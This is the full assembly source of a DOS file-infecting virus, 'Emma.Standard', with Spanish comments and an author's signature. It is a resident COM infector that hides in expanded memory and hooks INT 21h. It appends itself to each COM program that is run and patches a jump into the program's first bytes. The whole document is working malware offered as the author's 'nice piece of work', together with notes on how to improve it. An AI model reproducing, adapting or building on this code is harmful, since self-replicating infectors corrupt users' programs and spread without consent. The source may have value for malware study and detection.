; Emma.Standard.1.411
; ---------------------------------------------------------------------------
; ! Virus Name: Emma.Standard                                               !
; ! Version: 1                                                              !
; ! Type: Parasitic, Resident, COM Infector                                 !
; ! Length: 411 bytes                                                       !
; ---------------------------------------------------------------------------
; Descripcion tecnica:
;   o  Modo de residencia: Rutina sobre la IVT + pagina de EMS. El codigo
;      del virus se encuentra en EMS y la rutina (muy corta) sobre la
;      IVT mapea el virus en memoria baja y le da el control.
;   o  Metodo de infeccion: totalmente convencional. Se pone el JMP al
;      principio del file, apuntando al virus, y luego del virus,
;      restaurados los 3 bytes originales, se entrega el control al hoste
;   o  No hay reinfeccion de files, utilizando no el metodo de busqueda
;      de una 'marca' (ya sea esta dentro del file o en sus atributos,
;      etc) sino mirando en los 3 primeros bytes (ya que de todas formas
;      estos deben ser leidos, esto salva codigo)
;   o  El virus diferencia entre COM y EXE verdaderos, y deja intactos
;      los EXE
; Comentarios:
;   o  Un problema de dificil solucion gravita sobre toda la familia EMMA
;      de virus. Se trata de que el hecho de mapear una pagina sobre el
;      page frame DENTRO de int 21 colisionaria con programas que usen
;      la EMM, provocando una escandalosa caida del sistema.
;   o  El codigo esta bastante optimizado. Aun asi, el largo es excesivo
;      para un virus de estas caracteristicas, ya que preferi sacrificar
;      un poco de codigo, pero hacerlo 'ampliable' y 'upward compatible'
;   o  La prevencion de errores es casi nula.
;       o  El residence test es notoriamente elemental. En futuras versiones
;      esto se podria rever y mejorar.
; Side Note:
; Ojo la parte residente es NETAMENTE NO-REENTRANTE! por el hecho del mapeo
; de la pagina en memoria alta. Decidi utilizar una Busy Flag aun cuando el
; largo del codigo agregado es demasiado, por el hecho de que la Busy Flag se
; encuentre en memoria baja (en la IVT). El largo del codigo agregado es de
; 28 bytes. A primera vista esto no es viable, ya que haciendo CALL WORD
; PTR [OLDINT21] en lugar de cada INT 21, (en esta version del virus) solo
; habria 14 bytes mas. Pero en futuras versiones, la cosa se agrandaria, pues
; al haber mas rutinas que corren dentro de INT 21, habria mas CALLS. Esto
; ya deja la cosa asi para el futuro. Otra forma seria (ya que usamos la IVT)
; usar una INT alternativa, como hace el virus AT. JEJEJE. en todo caso habra
; que ver, en el futuro lo podremos cambiar.
; ya funca OK   yeah!

; Esquema:
;  [Fake Hoste]
;  [Virus :
;   1 - Data
;   2 - Resident Part
;           a - Low Memory Handler [+data]
;       b - High Memory Int 21 Handler
;       c - COM infector
;   3 - Transient Part
;       a - COM installer
;       b - Memory Management routine]
;
Emma        segment para public
    assume cs:emma, ss:emma
    org 100h
    .386
VirLen      equ     offset VirEnd-offset VirBegin
Start:
; ---------------------------------------------------------------------------
    ; Fake Hoste
    db 0e9h
    dw offset VirBegin-offset Start-3
    int 21h
; ---------------------------------------------------------------------------
; Virus Begins Here
VirBegin:
    jmp InstallCom
; ---------------------------------------------------------------------------
; Data
    OrBytes     db       0b8h, 0, 4ch   ; 20h-3 dup(0) <== esto iria pal EXE
    EMMString   db       "EMMXXXX0"
    ReadBuff    db       0e9h, "MP"
;   Identificacion. Sacar luego, si molesta, jejeje
;   VirName     db      "EMMA virus "
;           db  "(Expanded Memory Major Anoyance) "
;   Author      db  "By Trurl "
;   Location    db  "Bs As, 1994"
; ---------------------------------------------------------------------------
; Resident PArt
Int21Entry:
; Note: Here we map a page into the page frame without concerning about
; what could be mapped there. This must be solved later.
    pushf
    ; check busy flag
    cmp byte ptr cs:[offset BusyFlag-offset Int21Entry], 0
    jnz WereBusy
    pusha
    mov ax, 4400h
    xor bx, bx
    mov dx, cs:[offset Handle-offset Int21Entry]
    int 67h
    popa
    popf
    db 09ah ; CALL FAR Note that PFrame must be continuous
    dw offset Int21Handler-offset VirBegin
    PFrame      dw          0
    pusha
    pushf
    mov ax, 4400h
    mov bx, 0ffffh
    mov dx, cs:[offset Handle-offset Int21Entry]
    int 67h
    mov bp, sp
    mov ax, [bp]
    mov [bp+2+16+4], ax
    popf
    popa
    iret
    ; Data necesary for this 'lonely' routine
    Handle      dw          0
    BusyFlag    db          0
WereBusy:
    popf
    db 0eah
    OldInt21        dd          0
EndInt21Entry:

Int21Handler:
    pushf
    xchg ax, dx
    cmp dx, 4b00h
    jz RunProgFunc
    xchg ax, dx
    call cs:dword ptr [offset OldInt21-offset VirBegin]
    retf
RunProgFunc:
    popf
    call ShiftFlag
    xchg ax, dx
    push ds
    push dx
    pushf   ; Run program
    call cs:dword ptr [offset OldInt21-offset VirBegin]
    pushf
    pusha
    push ds
    mov bp, sp
    lds dx, [bp+20]
    mov ax, 3d02h       ; Open File
    int 21h
    xchg bx, ax
    mov ah, 3fh     ; Leer 3 bytes
    mov cx, 3
    push cs
    pop ds
    mov dx, offset OrBytes-offset VirBegin
    int 21h
    mov ax, 4202h       ; goto eof
    cwd
    xor cx, cx
    int 21h
    sub ax, 3
    push ax
    sub ax, VirLen
    cmp ax, word ptr ds:[offset OrBytes-offset VirBegin+1]
    jz AlreadyInfected  ; Prevent Reinfection
    mov ax, 'ZM'
    cmp ax, word ptr ds:[offset OrBytes-offset VirBegin]
    jz AlreadyInfected  ; Don't infect EXE's
    pop ax
    mov word ptr ds:[offset ReadBuff-offset VirBegin+1], ax

    mov ah, 40h     ; Write Virus
    mov cx, VirLen
    cwd
    int 21h
    mov ax, 4200h       ; Goto Begining of file
    xor cx, cx
    cwd
    int 21h
    mov ah, 40h     ; Write JMP
    mov cx, 3
    mov dx, offset ReadBuff-offset VirBegin
    int 21h
    jmp Done
AlreadyInfected:
    add sp, 2
Done:
    mov ah, 3eh     ; Close File
    int 21h
    call ShiftFlag
    pop ds
    popa
    push bp
    mov bp, sp; BP - BP, BP+2 - FLAGS, BP+4 - DX, BP+6 - DS, BP+8 - RADD
    lea sp, [bp+8]      ; Fix Up SP for RETurn
    push ax
    mov ax, [bp+2]
    push ax
    popf
    pop ax
    mov bp, [bp]
    retf

; Turn on and off the fucking sonofabitch busy flag
; obviously in the vector table area, where the handler is, shit fuck
ShiftFlag:
    push ax
    push ds
    mov ax, 24h
    mov ds, ax
    xor byte ptr ds:[offset BusyFlag-offset Int21Entry], 1
    pop ds
    pop ax
    ret


; ---------------------------------------------------------------------------
; Non-Resident (Installing) Part
InstallCom:
    pusha
    mov bx, cs:[101h]   ; get off. of vir in mem.
    add bx, 103h
    call InstallMem     ; install
    mov di, si      ; virus relys on SI=100 on program entry
    lea si, [bx+offset OrBytes-offset VirBegin]
    movsb           ; restore original bytes
    movsw
    popa
    jmp si          ; get out

InstallMem:
; Hace toda la alocacion en memoria y hookeo de ints. Conserva los registros.
; Entrada: BX offset del Virus en memoria
    push bx
    push si
    push es
    push ds
    push bx; para salvar el adress
    push bx;

    ; Already-Resident check
    push ds
    mov ax, 24h
    mov ds, ax
    cmp word ptr ds:[0], 2e9ch
    pop ds
    jz NotPresent   ; The virus is already loaded ==> jmp to NotPresent

    ; First we must detect whether an EMM is loaded or not. If it's not, we
    ; must not load (we'll do it that way by now). If it is, we do the
    ; EMM load.
    lea si, [bx+offset EMMString-offset VirBegin]
    mov ax, 3567h   ; We'll use the Get Interrupt Method of finding out
    int 21h         ; if an EMM is present or not.
    mov di, 10      ; offset of EMMXXXXX0 within Device Driver
    mov cx, 8
    repz cmpsb
    jnz NotPresent

    mov ah, 42h     ; Check that there is at least one page free
    int 67h         ; (Since there is no error detection...)
    cmp bx, 1
    jl NotPresent
    mov ah, 41h     ; Get Page Frame Add.
    int 67h
    pop si  ; si <=== adress of virus in hoste seg.
    mov cs:word ptr [offset PFrame-offset VirBegin+si], bx
    mov es, bx
    mov ah, 43h     ; Allocate one Page
    mov bx, 1
    int 67h
    mov cs:word ptr [offset Handle-offset VirBegin+si], dx  ; Save Handle
    mov ax, 4400h       ; Map the page
    mov bx, 0
    int 67h
    ; Hangs and all that crap
    mov ax, 3521h
    int 21h
    ; si must hold address of virus. (if code is added, push)
    mov cs:word ptr [offset OldInt21-offset VirBegin+si], bx
    mov cs:word ptr [offset OldInt21-offset VirBegin+2+si], es

    mov es, cs:word ptr [offset PFrame-offset VirBegin+si]
    xor di, di          ; Copy the virus
    ; si must hold address of virus. (if code is added, push)
    mov cx, VirLen
    repz movsb
    mov ax, 4400h       ; UnMap the page
    mov bx, 0ffffh
    int 67h

    mov di, 24h
    mov bx, di
    mov es, di
    xor di, di
    pop si  ; si <=== adress of virus in hoste seg.
    add si, offset Int21Entry-offset VirBegin
    mov cx, offset EndInt21Entry-offset Int21Entry
    repz movsb
    mov ds, bx
    xor dx, dx
    mov ax, 2521h
    int 21h
    jmp OutLStack
NotPresent:
    add sp, 4
OutLStack:
    pop ds
    pop es
    pop si
    pop bx
    ret
VirEnd:
ends
end Start
; Another nice piece of work by .... Trurl
; TrUrL RuLeZ!
; Trurl  Trurl  Trurl  Trurl  Trurl  Trurl  Trurl  Trurl  Trurl  Trurl  Trurl
